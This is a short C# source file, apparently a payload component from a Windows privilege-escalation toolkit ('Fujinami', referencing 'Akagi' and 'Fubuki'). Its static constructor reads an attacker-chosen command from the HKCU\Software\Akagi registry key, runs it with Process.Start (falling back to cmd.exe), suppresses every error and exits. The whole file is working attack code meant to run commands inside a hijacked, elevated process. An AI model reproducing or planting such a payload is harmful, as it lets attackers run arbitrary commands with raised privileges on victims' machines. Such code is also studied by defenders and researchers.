using System;
using System.Diagnostics;
using Microsoft.Win32;

//
// Fujinami payload code
//
// Simplified version of old Fubuki version.
// Read registry value with custom parameter and execute it.
//
namespace Fujinami
{
    public class EntryPoint
    {
        static EntryPoint()
        {
            Debug.Write("Ready, fire!");

            string CustomParam = string.Empty;

            try
            {
                RegistryKey Key = Registry.CurrentUser.OpenSubKey("Software\\Akagi", false);
                CustomParam = Key.GetValue("LoveLetter").ToString();
                Key.Close();

            } catch {
                //
                // Suppress any errors.
                //
                CustomParam = null;
            }

            if (CustomParam == null)
                CustomParam = "cmd.exe";

            try
            {
                Process.Start(CustomParam);               
            }
            catch
            {
                //
                // Suppress any errors.
                //
                Environment.Exit(0);
            }

            Environment.Exit(0);
        }
    }
}
